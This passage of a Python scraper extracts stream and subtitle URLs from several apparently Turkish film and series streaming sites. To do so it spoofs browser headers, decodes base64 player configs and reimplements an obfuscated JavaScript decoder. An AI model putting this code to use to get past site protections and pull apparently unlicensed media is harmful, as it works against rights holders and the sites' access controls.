    tip = re.findall(r"encodeURIComponent\(src\)\+'(.*?)&h", page)[0]
    js = requests.get("https://streamdata.vaplayer.ru/api.php?tmdb=" + tmdb + tip, headers ={"User-Agent": UA, "Referer": "https://brightpathsignals.com/"}).json()
    links = js.get("data")["stream_urls"]
    secenek = []
    for i, link in enumerate(links):
        secenek.append("Seçenek-" + str(i+1))
    link = select(secenek, links) 
    return link

def dizipal(url):
    session = requests.Session()
    kok = baseUrl(url) + "/"
    response = session.get(url)
    html_content = response.text
    cfg_pattern = r'data-cfg="([a-f0-9]{32})"'
    match = re.search(cfg_pattern, html_content)
    cfg_value = match.group(1)
    ajax_url = f"{kok}ajax-player-config" 
    headers = {
        'X-Requested-With': 'XMLHttpRequest',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Referer': url,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    }
    payload = {
        'cfg': cfg_value
    }
    ajax_response = session.post(ajax_url, data=payload, headers=headers)
    result = ajax_response.json()
    video_url = result['config'].get('v')
    page = session.get(video_url, headers=headers).text
    try:
        link = re.findall('sources\s*:\s*\[\{file\s*:\s*"(.*?)"', page)[0] + "#User-Agent=" + UA + "Referer=" + baseUrl(video_url)
        subtitle = re.findall('tracks\s*:\s*\[\{file\s*:\s*"(.*?)"', page)
    except:
        h = video_url.split("/")[-1]
        post_url = "https://imagestoo.com/player/index.php?data=" + h + "&do=getVideo"
        headers = {"User-Agent": UA, "Referer": video_url, "x-requested-with": "XMLHttpRequest"}
        payload = {"hash": h, "r": url}
        post_page = requests.post(post_url, headers = headers, data = json.dumps(payload)).text
        link = json.loads(post_page).get("videoSource") + "#Accept=*/*" + "&User-Agent=" + UA
        subtitle = re.findall('Turkish\]([^"]+tur.vtt)', page)
    return [link, subtitle]

def liderfilm(url):
    headers = {
        'X-Requested-With': 'XMLHttpRequest',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Referer': url,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    }
    session = requests.Session()
    subtitle =[]
    response = session.get(url, headers = headers)
    html_content = response.text
    b64 = r"window\._vs\s*=\s*'(.*?)'"
    match = re.search(b64, html_content)
    b64 = match.group(1)
    data = base64.b64decode(b64).decode()
    parsed_data = json.loads(data)
    embed_link = parsed_data[0].get("url")
    embed_kok = baseUrl(embed_link)
    response = session.get(embed_link, headers=headers)
    result = response.text
    subtitle = [embed_kok + re.findall("file\s*:\s*'(.*?)'", result)[0]+ '#Referer=' + embed_kok + '&User-Agent=' + UA + "&Origin=" +embed_kok]
    link = embed_kok + re.findall('sources\s*:\s*\[\s*\{\s*file\s*:\s*"(.*?)"', result)[0].replace("\\/","/")
    link_page = requests.get(link,headers={"Referer": embed_kok, "User-Agent": UA}).text
    video_uri = None
    video_match = re.search(r'#EXT-X-STREAM-INF:.*?[\r\n]+([^\r\n#]+)', link_page)
    if video_match:
        video_uri = embed_kok + video_match.group(1).strip()
        return [video_uri + '#Referer=' + embed_kok + '&User-Agent=' + UA + "&Origin=" + embed_kok, subtitle] 
    
def dizibal(url):
    kok = "/".join(url.split("/")[:3])
    headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36", "x-requested-with": "XMLHttpRequest",
               "content-type":"application/x-www-form-urlencoded; charset=UTF-8","sec-ch-ua-mobile": "?1"}
    
    if "series" in url:
        url_raw = url.split("season")
        url = url_raw[0]
        es = "seasons" + url_raw[1].replace("episode", "episodes")
        url = url.replace("/series/", "/api/series/") + "seasons?lang=tr-TR&siteMode=full"
        js = requests.get(url, headers = headers).json()
        series_id = js["data"]["seriesId"]
        url = kok + "/api/series/" + series_id + "/" + es + "/stream?lang=tr-TR&siteMode=full"
        
    else:
        url = url.replace("/movie/", "/api/movies/") + "?lang=tr-TR&siteMode=full"
    js = requests.get(url, headers = headers).json()
    src = js["data"]["src"]
    js = requests.get(kok + "/api/stream/embed?code=" + src + "&autoplay=1&siteMode=full", headers = headers).json()
    embed_url = js["embedUrl"]
    page = requests.get(embed_url, headers = headers).text
    subtitle = re.findall('\[Türkçe\](.*?\.vtt)', page)
    f = re.findall("fetch\('(.*?)'", str(page))
    last_link = baseUrl(embed_url) + f[0]
    headers["Referer"] = baseUrl(last_link)
    headers["sec-fetch-site"] = "same-origin"
    js = requests.get(last_link, headers = headers).json()
    link = js["url"]
    return [link + "#Referer= " + baseUrl(last_link) + "&User-Agent=" + UA, subtitle]

def dizirella(url):
    import urllib.parse

    def _0xe16c(d, e, f):
        chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ+/"
        h = chars[:e]
        # JavaScript'in reverse().reduce() mantığı
        j = 0
        for idx, char in enumerate(d[::-1]):
            if char in h:
                j += h.index(char) * (e ** idx)
        
        # Base f dönüşümü (bu kısım genellikle 10 tabanına döner)
        if j == 0: return "0"
        k = ""
        i_chars = chars[:f]
        while j > 0:
            k = i_chars[j % f] + k
            j = (j - (j % f)) // f
        return k

    def deobfuscate(h, u, n, t, e):
        r = ""
        i = 0
        while i < len(h):
            s = ""
            while i < len(h) and h[i] != n[e]:
                s += h[i]
                i += 1
            
            # Karakter değiştirme simülasyonu
            for j in range(len(n)):
                s = s.replace(n[j], str(j))
            
            if s:
                char_code = int(_0xe16c(s, e, 10)) - t
                r += chr(char_code)
            i += 1
        return urllib.parse.unquote(r)
    kok = "/".join(url.split("/")[:3])
    headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36", "x-requested-with": "XMLHttpRequest",
               "content-type":"application/x-www-form-urlencoded; charset=UTF-8","sec-ch-ua-mobile": "?1"}
    page = requests.get(url, headers = headers).text
    iframe = re.findall('iframe src="([^"]+)"', page)[0]
    iframe = iframe if iframe.startswith("http") else kok + iframe
    headers["Referer"] = url
    page = requests.get(iframe, headers = headers).text
    data = re.findall('\("(.*?)"\s*,\s*(\d+)\s*,\s*"(.*?)"\s*,\s*(\d+)\s*,\s*(\d+)', page)[0]
    result = deobfuscate(data[0], int(data[1]), data[2], int(data[3]), int(data[4]))
    try:
        iframe = re.findall('iframe\.src\s*=\s*"(.*?)"', result)[0]
    except:
        link = re.findall('file\s*:\s*"(.*?)"', result)[0]
        subs = re.findall('"file"\s*:\s*"(.*?tur.*?\.vtt)"', result)
        subs = [sub.replace("\\/","/") for sub in subs ]
        return [link, subs]
    headers["Referer"] = baseUrl(iframe)
    page = requests.get(iframe,headers = headers).text
    data = re.findall('\("(.*?)"\s*,\s*(\d+)\s*,\s*"(.*?)"\s*,\s*(\d+)\s*,\s*(\d+)', page)[0]
    result = deobfuscate(data[0], int(data[1]), data[2], int(data[3]), int(data[4]))
    link = re.findall('videoFile\s*=\s*"(.*?)"', result)[0].replace("\\/", "/")
    subs = [re.findall('"file"\s*:\s*"([^"]+)"\s*,\s*"label"\s*:\s*"T', result)[0].replace("\\/", "/")]
    return [link, subs]

def altiyuz(url):
    headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36", "x-requested-with": "XMLHttpRequest",
               "content-type":"application/x-www-form-urlencoded; charset=UTF-8","sec-ch-ua-mobile": "?1"}
    page = requests.get(url, headers = headers).text
    iframe = re.findall("initialSource\s*:\s*'([^']+)'", page)[0].replace("\\/","/").replace("#","")
    parts = iframe.split('/')
    pre_link = '/'.join(parts[:-1]) + '/'
    code = "".join(char for char in parts[-1] if char.isalnum())
    link = pre_link + "videos/" + code + "/master.m3u8"
    sub = [pre_link + "videos/" + code + "/subtitles/English.vtt"]
    return [link, sub]

def vidmody(url):
    page = requests.get(url).text
    link = re.findall('#EXT-X-STREAM-INF:.*?RESOLUTION=.*?(https:.*?\.gif)', page, re.DOTALL)[0]
    return link


# from log_helper import log_exceptions
# # Tüm fonksiyonları otomatik sar
# import inspect
# for name, obj in list(globals().items()):
#     if inspect.isfunction(obj) and obj.__module__ == __name__:
#         globals()[name] = log_exceptions(obj)
